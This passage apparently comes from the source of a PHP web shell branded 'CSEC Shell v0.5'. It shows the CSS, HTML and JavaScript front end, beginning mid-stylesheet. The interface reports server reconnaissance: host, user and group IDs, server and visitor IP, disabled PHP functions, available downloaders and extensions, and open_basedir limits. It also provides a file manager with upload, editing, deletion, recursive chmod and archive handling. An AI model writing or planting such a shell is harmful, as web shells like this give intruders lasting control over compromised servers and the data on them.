.swal2-actions .swal2-deny{
  background:#2e3a48 !important;
  color:#e0e6ee !important;
  border-radius:8px !important;
  padding:8px 14px !important;
  font-weight:600 !important;
}
/* Batasi lebar popup dan pastikan input selalu muat di dalamnya */
.swal2-popup{
  width: min(520px, 92vw) !important;   /* cap lebar popup */
}

/* Input wajib full-width di dalam popup */
.swal2-popup .swal2-input{
  width: 100% !important;               /* isi penuh kontainer popup */
  max-width: none !important;           /* jangan pakai batas max kecil */
  box-sizing: border-box !important;    /* padding masuk perhitungan lebar */
  margin: 0 !important;
  text-align: left;                     /* atau 'center' kalau mau */
}
.swal2-popup {
  width: min(520px, 92vw) !important;
  padding-left: 20px !important;   /* kasih ruang kiri */
  padding-right: 20px !important;  /* kasih ruang kanan */
}

.swal2-popup .swal2-input {
  width: 100% !important;
  max-width: none !important;
  box-sizing: border-box !important;
  margin: 10px 0 !important;       /* kasih ruang atas & bawah */
  padding: 8px 12px !important;    /* biar teks lega di dalam input */
  border-radius: 6px;              /* biar rapi */
}
.swal2-input::placeholder {
  color: var(--muted);
  opacity: 0.5;
}
/* ==== Action buttons ==== */
.actions { display:flex; gap:6px; align-items:center; flex-wrap:wrap }
.btn-act{
  display:inline-flex; align-items:center; gap:6px;
  padding:6px 10px; border-radius:8px; font-weight:600; font-size:12px;
  line-height:1; text-decoration:none; border:1px solid transparent;
  background:#2e3a48; color:#e0e6ee; transition:filter .15s, transform .02s;
}
.btn-act:hover{ text-decoration:none; filter:brightness(1.06) }
.btn-act:active{ transform:translateY(1px) }
.btn-act .fa{ font-size:12px; opacity:.95 }

/* Variants */
.btn-edit    { background:#273a63; border-color:#324a7d }      /* biru */
.btn-dl      { background:#21483a; border-color:#2c5d49 }      /* hijau tua */
.btn-zip     { background:#3a3046; border-color:#4a3d58 }      /* ungu gelap */
.btn-unzip   { background:#4a2f58; border-color:#5c3b6f }      /* ungu */
.btn-chmod   { background:#3f371f; border-color:#52482a }      /* cokelat */
.btn-delete  { background:#5c2b29; border-color:#743532 }      /* merah */
.btn-rename  { background:#15c15d; color:#0b1117 }             /* hijau terang */

.rename-inline{ display:inline-flex; gap:6px; align-items:center; flex-wrap:wrap }
.rename-inline input[type="text"]{
  width:140px; padding:6px 10px; border-radius:8px;
  background:#0f1620; border:1px solid var(--border); color:var(--text);
}
.rename-inline .btn{ padding:6px 10px; border-radius:8px }

.sysgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:6px 16px;font-size:12px}
.sysgrid b{color:#9db1c8}
.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Courier New",monospace}
.kpill{display:inline-block;padding:2px 8px;border-radius:999px;border:1px solid var(--border);background:#0f1620}
.kpill.ok{background:#0f3b2a}
.kpill.bad{background:#402222}
.sysdet{display:inline}
.sysdet summary{
  cursor:pointer; display:inline-block; padding:2px 8px;
  border-radius:8px; background:#0f1620; border:1px solid var(--border)
}
.sysdet[open] summary{background:#0f2028}
.chips{display:flex; flex-wrap:wrap; gap:6px; margin-top:8px}
.chip{display:inline-flex; align-items:center; padding:2px 8px;
  border-radius:999px; background:#0f1620; border:1px solid var(--border);
  font-size:12px
}
/* ========== Topbar ========== */
.container { margin: 0 auto; }          /* opsional, biar gak terlalu lebar */
.topbar{
  position: sticky; top: 0; z-index: 100;
  background: var(--panel);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 10px 14px;
  margin: 0 0 12px 0;
  display: flex; align-items: center; gap: 14px;
  box-shadow: 0 8px 20px rgba(0,0,0,.18);
}
.brand{display:flex; align-items:center; gap:10px; font-weight:700}
.logo{
  font-weight:800; letter-spacing:.4px;
  padding:6px 10px; border-radius:10px;
  background: linear-gradient(180deg,#0f2028,#0f1620);
  border:1px solid var(--border);
}
.title{opacity:.95}
.ver{
  font-size:12px; padding:2px 8px; border-radius:999px;
  border:1px solid var(--border); color:#9db1c8; background:#0f1620;
}
.top-actions{margin-left:auto; display:flex; align-items:center; gap:12px}
.meta{color:#9db1c8; font-size:12px}
.logout-btn{
  display:inline-flex; align-items:center; gap:8px;
  background:#ff6b6b; color:#0b1117; font-weight:700;
  border:0; padding:8px 12px; border-radius:10px; cursor:pointer;
  text-decoration:none;
}
.logout-btn:hover{filter:brightness(1.06)}
.logout-icon{font-family:"Font Awesome 4.7.0";} /* sudah pakai FA 4.7 */
.logout-icon:before{content:"\f08b"} /* fa-sign-out */
/* responsif */
@media (max-width: 720px){
  .meta,.ver{display:none}
  .logo{padding:5px 8px}
  .topbar{padding:8px 10px}
}
.logout-icon:before{
  content:"\f08b";
  font-family:"FontAwesome";   /* <-- nama font yang benar untuk FA 4 */
  font-style:normal;
  font-weight:normal;
  -webkit-font-smoothing:antialiased;
  -moz-osx-font-smoothing:grayscale;
}
/* Hilangkan underline di tombol logout */
.logout-btn,
.logout-btn:hover {
  text-decoration: none !important; /* pakai !important kalau perlu */
}

</style>
</head>
<body>
    <div class="container">
        <header class="topbar">
            <div class="brand">
            <span class="logo">CSEC</span>
            <span class="title">Shell</span>
            <span class="ver">v0.5</span>
            </div>

            <!-- opsional info ringkas (bisa dihapus kalau penuh) -->
            <div class="meta">
            <?= h(php_uname('n')) ?> • PHP <?= h(PHP_VERSION) ?>
            </div>

            <div class="top-actions">
            <a class="logout-btn" href="?logout=1<?= $token_query ?>" aria-label="Logout">
                <i class="logout-icon"></i><span>Logout</span>
            </a>
            </div>
        </header>
    </div>

    <?php $SYS = sysinfo_collect(); ?>
    <div class="box">
        <div class="sysgrid">
            <div><b>Uname:</b> <span class="mono"><?= h($SYS['uname']) ?></span></div>
            <div><b>User:</b> <?= h((string)$SYS['uid']) ?> [ <span class="mono"><?= h($SYS['user']) ?></span> ]
                &nbsp; <b>Group:</b> <?= h((string)$SYS['gid']) ?> [ <span class="mono"><?= h($SYS['group']) ?></span> ]</div>
            <div><b>PHP:</b> <?= h($SYS['php']) ?> &nbsp; Safe Mode: <span class="kpill">OFF</span></div>
            <div><b>ServerIP:</b> <?= h($SYS['srv_ip']) ?> &nbsp; <b>Your IP:</b> <?= h($SYS['cli_ip']) ?></div>
            <div><b>DateTime:</b> <?= h($SYS['dt']) ?></div>
            <div>
            <?php
                $dt = $SYS['disk'];
                echo '<b>HDD:</b> Total:'.h(fmt_size($dt['total'])).' Free:'.h(fmt_size($dt['free'])).' ['.h($dt['usedp']).'%]';
            ?>
            </div>
            <div><b>Useful:</b> <span class="mono"><?= h($SYS['useful']) ?></span></div>
            <div><b>Downloader:</b> <span class="mono"><?= h($SYS['downldr']) ?></span></div>
            <?php
                $df = $SYS['disabled'];
                $funcs = array_filter(array_map('trim', $df==='All Functions Accessible' ? [] : explode(',', $df)));
                ?>
            <div>
                <b>Disable Functions:</b>
                <?php if (!$funcs): ?>
                    <span class="mono">All Functions Accessible</span>
                <?php else: ?>
                    <details class="sysdet">
                    <summary><?= count($funcs) ?> items</summary>
                    <div class="chips">
                        <?php foreach ($funcs as $fn): ?>
                        <span class="chip mono"><?= h($fn) ?></span>
                        <?php endforeach; ?>
                    </div>
                    </details>
                <?php endif; ?>
            </div>

            <div>
            <b>Ext:</b>
            CURL: <span class="kpill <?= $SYS['ext']['curl']==='ON'?'ok':'bad' ?>"><?= $SYS['ext']['curl'] ?></span> |
            SSH2: <span class="kpill <?= $SYS['ext']['ssh2']==='ON'?'ok':'bad' ?>"><?= $SYS['ext']['ssh2'] ?></span> |
            MySQL: <span class="kpill <?= $SYS['ext']['mysql']==='ON'?'ok':'bad' ?>"><?= $SYS['ext']['mysql'] ?></span> |
            PgSQL: <span class="kpill <?= $SYS['ext']['pgsql']==='ON'?'ok':'bad' ?>"><?= $SYS['ext']['pgsql'] ?></span> |
            Oracle: <span class="kpill <?= $SYS['ext']['oci8']==='ON'?'ok':'bad' ?>"><?= $SYS['ext']['oci8'] ?></span> |
            CGI: <span class="kpill <?= $SYS['cgi']==='ON'?'ok':'bad' ?>"><?= $SYS['cgi'] ?></span>
            </div>
            <div>
            <b>Open_basedir:</b> <span class="mono"><?= h($SYS['openbd']) ?></span> |
            <b>Safe_mode_exec_dir:</b> <span class="mono"><?= h($SYS['sm_exec']) ?></span> |
            <b>Safe_mode_include_dir:</b> <span class="mono"><?= h($SYS['sm_inc']) ?></span>
            </div>
        </div>
    </div>


    <?php if (!empty($flash)): foreach ($flash as $f): [$t,$m]=$f; ?>
        <div class="<?= $t==='ok'?'flash-ok':'flash-err' ?>"><?= h($m) ?></div>
    <?php endforeach; endif; ?>

    <div class="box path">
        <div class="flex">
            <div><b>Current:</b> <span class="badge mono"><?php
                $base   = base();                 // root jail absolut
                $abs    = $cwd;                   // path absolut tempat kita berada
                $sep    = DIRECTORY_SEPARATOR;

                // Cetak root sebagai link ke BASE_DIR (di kasus ini "/")
                echo '<a href="?dir=' . urlencode(base()) . $token_query . '">' . h($sep) . '</a>';

                // Pecah path absolut jadi segmen
                $parts = array_values(array_filter(explode($sep, trim($abs, $sep)), 'strlen'));

                $acc = '';                        // penumpuk segmen menjadi path bertahap
                $n   = count($parts);
                    foreach ($parts as $i => $seg) {
                        $acc .= $sep . $seg;

                        // Hanya tautkan kalau segmen tsb masih di dalam BASE_DIR
                        if (is_within_base($acc)) {
                            $rp = realpath($acc) ?: $acc;
                            echo '<a href="?dir=' . urlencode($rp) . $token_query . '">' . h($seg) . '</a>';
                        } else {
                            // di luar jail → tampilkan sebagai teks biasa (non-klik)
                            echo h($seg);
                        }

                        if ($i < $n - 1) echo h($sep);
                    }
                ?></span>
            </div>

            <form class="right flex" method="GET">
                <input type="hidden" name="dir" value="<?= h($cwd) ?>">
                <?php if(!USE_COOKIE): ?><input type="hidden" name="auth" value="<?= h($tok) ?>"><?php endif; ?>
                <input class="search" type="text" name="q" placeholder="Search" value="<?= h($search) ?>">
                <select name="sort">
                    <option value="name" <?= $sort==='name'?'selected':'' ?>>Name</option>
                    <option value="size" <?= $sort==='size'?'selected':'' ?>>Size</option>
                    <option value="mtime" <?= $sort==='mtime'?'selected':'' ?>>Modified</option>
                    <option value="type" <?= $sort==='type'?'selected':'' ?>>Type</option>
                </select>
                <select name="order">
                    <option value="asc" <?= $order==='asc'?'selected':'' ?>>Asc</option>
                    <option value="desc" <?= $order==='desc'?'selected':'' ?>>Desc</option>
                </select>
                <button class="btn secondary" type="submit">Apply</button>
            </form>
        </div>
    </div>

    <div class="box">        
        <div class="flex">
            <?php if (ENABLE_UPLOAD): ?>
            <form method="POST" enctype="multipart/form-data" class="flex" onsubmit="return addCsrf(this)">
            <input type="file" name="upload" required>
            <input type="hidden" name="dir"  value="<?= h($cwd) ?>">
            <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
            <?php if(!USE_COOKIE): ?><input type="hidden" name="auth" value="<?= h($tok) ?>"><?php endif; ?>
            <button class="btn" type="submit">Upload</button>
            </form>
            <?php endif; ?>

            <?php if (ENABLE_NEWFILE): ?>
            <form method="POST" class="flex" onsubmit="return addCsrf(this)">
            <input type="text" name="newfile_name" placeholder="New file name">
            <input type="hidden" name="dir"  value="<?= h($cwd) ?>">
            <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
            <?php if(!USE_COOKIE): ?><input type="hidden" name="auth" value="<?= h($tok) ?>"><?php endif; ?>
            <button class="btn" type="submit">Create File</button>
            </form>
            <?php endif; ?>

            <?php if (ENABLE_MKDIR): ?>
            <form method="POST" class="flex" onsubmit="return addCsrf(this)">
            <input type="text" name="mkdir_name" placeholder="New folder name">
            <input type="hidden" name="dir"  value="<?= h($cwd) ?>">
            <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
            <?php if(!USE_COOKIE): ?><input type="hidden" name="auth" value="<?= h($tok) ?>"><?php endif; ?>
            <button class="btn" type="submit">Create Folder</button>
            </form>
            <?php endif; ?>

            <?php if (ENABLE_BULK): ?>
            <form id="bulkDelete" method="POST" onsubmit="return addCsrf(this)" style="margin-left:auto">
            <input type="hidden" name="bulk_delete" value="1">
            <input type="hidden" name="dir"  value="<?= h($cwd) ?>">
            <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
            <?php if(!USE_COOKIE): ?><input type="hidden" name="auth" value="<?= h($tok) ?>"><?php endif; ?>
            <button class="btn secondary" type="submit">Bulk Delete</button>
            </form>

            <form id="bulkZip" method="POST" onsubmit="return addCsrf(this)">
            <input type="hidden" name="bulk_zip" value="1">
            <input type="hidden" name="dir"  value="<?= h($cwd) ?>">
            <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
            <?php if(!USE_COOKIE): ?><input type="hidden" name="auth" value="<?= h($tok) ?>"><?php endif; ?>
            <button class="btn secondary" type="submit">Bulk Zip</button>
            </form>
            <?php endif; ?>
        </div>
    </div>

    <form id="bulkItems" method="POST" style="display:none"></form>

    <div class="box">
        <?php $keep_dir = '&dir='.urlencode($cwd); ?>
        <table class="table">
            <tr>
                <?php if (ENABLE_BULK): ?><th><input class="chk" type="checkbox" onclick="toggleAll(this)"></th><?php endif; ?>
                <th>Name</th><th>Size</th><th>Modified</th><th>Perm</th><th>Action</th>
            </tr>
            <?php foreach ($items as $it): $real=$it['path']; $name=$it['name']; ?>
            <tr data-path="<?= h($real) ?>" data-name="<?= h($name) ?>" data-isdir="<?= $it['is_dir'] ? '1' : '0' ?>">
                <?php if (ENABLE_BULK): ?><td><input class="chk" type="checkbox" name="items[]" value="<?= h($real) ?>" form="bulkItems"></td><?php endif; ?>
                <td>
                    <i class="fa <?= $it['is_dir']?'fa-folder':'fa-file-o'?>"></i>
                    <?php if ($name==='..'): ?>
                        <?php $parent = dirname($cwd); ?>
                        <a href="?dir=<?= urlencode($parent) ?><?= $token_query ?>">..</a>
                    <?php else: ?>
                        <a href="?<?= $it['is_dir']?('dir='.urlencode($real)):('download='.urlencode($real)) ?><?= $token_query ?>"><?= h($name) ?></a>
                    <?php endif; ?>
                </td>
                <td><?= $it['is_dir']?'--':fmt_size($it['size']) ?></td>
                <td><?= date('Y-m-d H:i', $it['mtime']) ?></td>
                <td class="badge" title="<?= h(perms_to_string($real)) ?>"><?= h(octal_perm($real)) ?></td>
                <td class="actions">
                    <?php if ($name!=='..'): ?>

                        <?php if (!$it['is_dir'] && ENABLE_EDIT && is_editable_ext($real)): ?>
                        <a class="btn-act btn-edit" title="Edit"
                            href="?edit=<?= urlencode($real) ?><?= $token_query ?>&dir=<?= urlencode($cwd) ?>">
                            <i class="fa fa-pencil"></i> Edit
                        </a>
                        <a class="btn-act btn-dl" title="Download"
                            href="?download=<?= urlencode($real) ?><?= $token_query ?>">
                            <i class="fa fa-download"></i> Download
                        </a>
                        <?php elseif (!$it['is_dir']): ?>
                        <a class="btn-act btn-dl" title="Download"
                            href="?download=<?= urlencode($real) ?><?= $token_query ?>">
                            <i class="fa fa-download"></i> Download
                        </a>
                        <?php endif; ?>

                        <?php if (!$it['is_dir'] && ENABLE_UNZIP && strtolower(pathinfo($real, PATHINFO_EXTENSION))==='zip'): ?>
                        <a class="btn-act btn-unzip" title="Unzip"
                            href="?unzip=<?= urlencode($real) ?><?= $token_query ?>&dir=<?= urlencode($cwd) ?>&csrf=<?= h($csrf) ?>">
                            <i class="fa fa-folder-open"></i> Unzip
                        </a>
                        <?php endif; ?>

                        <?php if (ENABLE_ZIP): ?>
                        <a class="btn-act btn-zip" title="Zip"
                            href="?zip=<?= urlencode($real) ?><?= $token_query ?>&dir=<?= urlencode($cwd) ?>&csrf=<?= h($csrf) ?>">
                            <i class="fa fa-file-archive-o"></i> Zip
                        </a>
                        <?php endif; ?>

                        <a class="btn-act btn-delete" title="Delete"
                        href="?delete=<?= urlencode($real) ?><?= $token_query ?>&dir=<?= urlencode($cwd) ?>&csrf=<?= h($csrf) ?>"
                        onclick="return confirm('Delete <?= h($name) ?>?')">
                        <i class="fa fa-trash"></i> Delete
                        </a>

                        <?php if (ENABLE_CHMOD): ?>
                        <a class="btn-act btn-chmod" title="Chmod"
                            href="#" onclick="promptChmod('<?= h($real) ?>','<?= h($name) ?>'); return false;">
                            <i class="fa fa-key"></i> Chmod
                        </a>
                        <?php endif; ?>

                        <form method="POST" class="rename-inline" onsubmit="return addCsrf(this)">
                        <input type="hidden" name="rename_from" value="<?= h($real) ?>">
                        <input type="text"   name="rename_to"   value="<?= h($name) ?>" size="12" placeholder="New name">
                        <input type="hidden" name="dir"  value="<?= h($cwd) ?>">
                        <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
                        <?php if(!USE_COOKIE): ?><input type="hidden" name="auth" value="<?= h($tok) ?>"><?php endif; ?>
                        <button type="submit" class="btn btn-rename"><i class="fa fa-check"></i> Rename</button>
                        </form>

                    <?php endif; ?>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>
    </div>


    <?php if (ENABLE_EDIT && isset($_GET['edit'])): $f=realpath($_GET['edit']); if ($f && is_within_base($f) && is_file($f)): ?>
    <div class="box">
        <h3>Editing: <?= h(basename($f)) ?></h3>
        <form method="POST" onsubmit="return addCsrf(this)">
            <input type="hidden" name="filepath" value="<?= h($f) ?>">
            <textarea name="filecontent" rows="20"><?php echo h(@file_get_contents($f)); ?></textarea>
            <p>
                <input type="hidden" name="dir"  value="<?= h($cwd) ?>">
                <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
                <?php if(!USE_COOKIE): ?><input type="hidden" name="auth" value="<?= h($tok) ?>"><?php endif; ?>
                <button class="btn" name="savefile" value="1">Save File</button>
            </p>
        </form>

    </div>
    <?php endif; endif; ?>
    
    <!-- Context Menu (klik kanan) -->
    <div id="ctxMenu" style="position:fixed; z-index:9999; display:none; min-width:180px;
    background:#141b23; border:1px solid #243245; border-radius:10px; padding:6px;">
    <button type="button" class="ctx-btn" data-act="copy" style="width:100%;text-align:left;border:0;background:transparent;padding:8px 10px;cursor:pointer;color:#e0e6ee;">📄 Copy</button>
    <button type="button" class="ctx-btn" data-act="cut"  style="width:100%;text-align:left;border:0;background:transparent;padding:8px 10px;cursor:pointer;color:#e0e6ee;">✂️ Cut</button>
    <hr style="border:none;border-top:1px solid #243245;margin:6px 0;">
    <button type="button" class="ctx-btn" data-act="paste" style="width:100%;text-align:left;border:0;background:transparent;padding:8px 10px;cursor:pointer;color:#e0e6ee;">📥 Paste here</button>
    </div>

    <!-- Hidden form untuk aksi paste (gunakan handler Copy/Move yang sudah ada) -->
    <form id="pasteForm" method="POST" style="display:none">
    <input type="hidden" name="op"  value="">
    <input type="hidden" name="src" value="">
    <input type="hidden" name="dst" value="">
    <input type="hidden" name="dir"  value="<?= h($cwd) ?>">
    <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
    <?php if(!USE_COOKIE): ?><input type="hidden" name="auth" value="<?= h($tok) ?>"><?php endif; ?>
    </form>

    <!-- Hidden CHMOD form -->
    <form id="chmodForm" method="POST" style="display:none">
        <input type="hidden" name="chmod_path" id="chmod_path">
        <input type="hidden" name="chmod_mode" id="chmod_mode">
        <input type="hidden" name="chmod_recursive" id="chmod_recursive">
        <input type="hidden" name="dir"  value="<?= h($cwd) ?>">
        <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
        <?php if(!USE_COOKIE): ?><input type="hidden" name="auth" value="<?= h($tok) ?>"><?php endif; ?>
    </form>


<script>
function toggleAll(src){ document.querySelectorAll('input.chk[name="items[]"]').forEach(c=>c.checked=src.checked); }
function addCsrf(f){
  if(!f.querySelector('input[name="csrf"]')){
    f.insertAdjacentHTML('beforeend','<input type="hidden" name="csrf" value="<?= h($csrf) ?>">');
  }
  if(!f.querySelector('input[name="dir"]')){
    f.insertAdjacentHTML('beforeend','<input type="hidden" name="dir" value="<?= h($cwd) ?>">');
  }
  collectBulk();
  return true;
}

function collectBulk(){
  const form=document.getElementById('bulkItems');
  form.innerHTML='';
  document.querySelectorAll('input.chk[name="items[]"]:checked').forEach(c=>{
    let i=document.createElement('input');
    i.type='hidden'; i.name='items[]'; i.value=c.value; form.appendChild(i);
  });
  let c=document.createElement('input'); c.type='hidden'; c.name='csrf'; c.value='<?= h($csrf) ?>'; form.appendChild(c);
  let d=document.createElement('input'); d.type='hidden'; d.name='dir'; d.value='<?= h($cwd) ?>'; form.appendChild(d);
  <?php if(!USE_COOKIE): ?>let a=document.createElement('input'); a.type='hidden'; a.name='auth'; a.value='<?= h($tok) ?>'; form.appendChild(a);<?php endif; ?>
}

async function promptChmod(targetPath, name){
  const { value: mode } = await Swal.fire({
    title: 'CHMOD ' + name,
    input: 'text',
    inputLabel: 'Enter mode (e.g., 0755 or 0644)',
    inputPlaceholder: '0755',
    inputAttributes:{
      inputmode:'numeric',
      pattern:'[0-7]{3,4}',
      autocapitalize:'off',
      autocorrect:'off'
    },
    preConfirm:(val)=>{
      const m = String(val).replace(/^0o?/i,'');
      if(!/^[0-7]{3,4}$/.test(m)){
        Swal.showValidationMessage('Use 3–4 octal digits, e.g. 755 or 0644');
        return false;
      }
      return m;
    },
    showCancelButton:true,
    confirmButtonText:'OK',
    cancelButtonText:'Cancel'
  });
  if(!mode) return;

  const { isConfirmed: recursive } = await Swal.fire({
    title: 'Apply recursively?',
    text: 'Apply to all files and folders inside (for directories).',
    showCancelButton: true,
    showDenyButton: true,
    confirmButtonText: 'Yes, recursive',
    denyButtonText: 'No, just this'
  });

  const form = document.getElementById('chmodForm');

  // <<< penting: arahkan aksi ke folder aktif
  form.action = '?dir=<?= urlencode($cwd) ?><?= USE_COOKIE ? '' : '&auth='.h($tok) ?>';

  document.getElementById('chmod_path').value = targetPath;
  document.getElementById('chmod_mode').value = mode;
  document.getElementById('chmod_recursive').value = recursive ? '1' : '';
  form.submit();
}
</script>
<script>
// ===== Right-click Copy/Cut/Paste ala cPanel =====
(function(){
  const menu = document.getElementById('ctxMenu');
  const pasteForm = document.getElementById('pasteForm');
  const CWD = <?= json_encode($cwd) ?>;

  // Clipboard struktur: { type: 'copy'|'cut', items: [ {path, name, isdir} ] }
  const CLIPKEY = 'csec_clipboard_v1';

  function loadClip(){
    try { return JSON.parse(localStorage.getItem(CLIPKEY) || 'null') || {type:null, items:[]}; }
    catch(e){ return {type:null, items:[]}; }
  }
  function saveClip(clip){
    try { localStorage.setItem(CLIPKEY, JSON.stringify(clip)); } catch(e){}
  }
  function clearClip(){
    saveClip({type:null, items:[]});
  }

  let ctxTarget = null; // data baris yang di-klik kanan (optional)

  // Utility: dapatkan data dari <tr>
  function rowData(tr){
    return {
      path: tr.getAttribute('data-path'),
      name: tr.getAttribute('data-name'),
      isdir: tr.getAttribute('data-isdir') === '1'
    };
  }

  // Tampilkan menu
  function showMenu(x,y, hasRowTarget){
    // Enable/disable Paste
    const clip = loadClip();
    const pasteBtn = menu.querySelector('[data-act="paste"]');
    pasteBtn.disabled = !(clip.type && clip.items && clip.items.length);
    pasteBtn.style.opacity = pasteBtn.disabled ? 0.5 : 1;
    // Posisi
    menu.style.left = Math.max(8, Math.min(window.innerWidth - 200, x)) + 'px';
    menu.style.top  = Math.max(8, Math.min(window.innerHeight - 120, y)) + 'px';
    menu.style.display = 'block';
  }
  function hideMenu(){ menu.style.display='none'; }

  // Klik kanan pada baris
  document.addEventListener('contextmenu', function(e){
    const tr = e.target.closest('tr[data-path]');
    if (tr) {
      e.preventDefault();
      ctxTarget = rowData(tr);
      showMenu(e.clientX, e.clientY, true);
    } else {
      // klik kanan area kosong → bisa tetap paste ke CWD
      e.preventDefault();
      ctxTarget = null;
      showMenu(e.clientX, e.clientY, false);
    }
  });

  // Close menu saat klik di luar
  document.addEventListener('click', function(e){
    if (!menu.contains(e.target)) hideMenu();
  });
  window.addEventListener('scroll', hideMenu);
  window.addEventListener('resize', hideMenu);

  // Aksi button di menu
  menu.addEventListener('click', async function(e){
    const btn = e.target.closest('.ctx-btn');
    if (!btn) return;
    const act = btn.getAttribute('data-act');
    hideMenu();

    // Pastikan ada target saat Copy/Cut
    if ((act==='copy' || act==='cut') && !ctxTarget) {
      Swal.fire('No item','Klik kanan pada file/folder-nya dulu untuk Copy/Cut.','info');
      return;
    }

    if (act==='copy' || act==='cut') {
      const clip = { 
        type: (act==='copy' ? 'copy' : 'move'), 
        items: [ctxTarget] 
      };
      saveClip(clip);
      Swal.fire('Saved to clipboard', `${act==='copy'?'Copy':'Cut'}: ${ctxTarget.name}`, 'success');
      return;
    }

    if (act==='paste') {
      const clip = loadClip();
      if (!clip.type || !clip.items.length) {
        Swal.fire('Clipboard empty','Belum ada Copy/Cut.','info'); 
        return;
      }

      // Tujuan: jika klik kanan pada folder, paste ke folder itu; kalau tidak, paste ke folder aktif (CWD)
      let dstFolder = CWD;
      if (ctxTarget && ctxTarget.isdir) {
        dstFolder = ctxTarget.path;
      }

      // Konfirmasi ringkas
      const list = clip.items.map(i=>i.name).join(', ');
      const {isConfirmed} = await Swal.fire({
        title: 'Paste',
        html: `Action: <b>${clip.type.toUpperCase()}</b><br>Item(s): ${h(list)}<br>Destination: <code>${h(dstFolder)}</code>`,
        showCancelButton: true,
        confirmButtonText: 'Paste'
      });
      if (!isConfirmed) return;

      // Eksekusi satu-per-satu (submit form POST)
      for (const it of clip.items) {
        pasteForm.op.value  = clip.type;
        pasteForm.src.value = it.path;
        pasteForm.dst.value = dstFolder;

        clearClip();              // <<< Tambahkan ini: kosongkan clipboard
        pasteForm.submit();       // lalu submit
        break;
      }
    }
  });

  // HTML escape kecil untuk SweetAlert
  function h(s){ return String(s).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m])); }
})();
</script>

</body>
</html>
